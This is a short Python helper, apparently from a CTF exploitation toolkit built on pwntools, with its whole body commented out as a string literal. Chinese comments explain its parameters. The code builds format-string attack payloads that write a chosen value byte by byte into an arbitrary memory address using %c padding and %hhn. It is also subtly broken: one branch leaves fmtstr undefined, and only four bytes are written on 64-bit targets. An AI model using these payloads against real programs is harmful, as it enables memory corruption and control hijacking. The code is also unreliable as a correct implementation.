from ..misc import *

'''
offset 表示要覆盖的地址最初的偏移
size 表示机器字长
addr 表示将要覆盖的地址
target 表示我们要覆盖为的目的变量值
'''
'''
arch_size = 8
if context.arch == "amd64":
    arch_size = 8
elif context.arch == "i386":
    arch_size = 4


def fmt_str(offset, addr, target, size: int = arch_size):
    payload = b""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload


def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr.encode()
'''

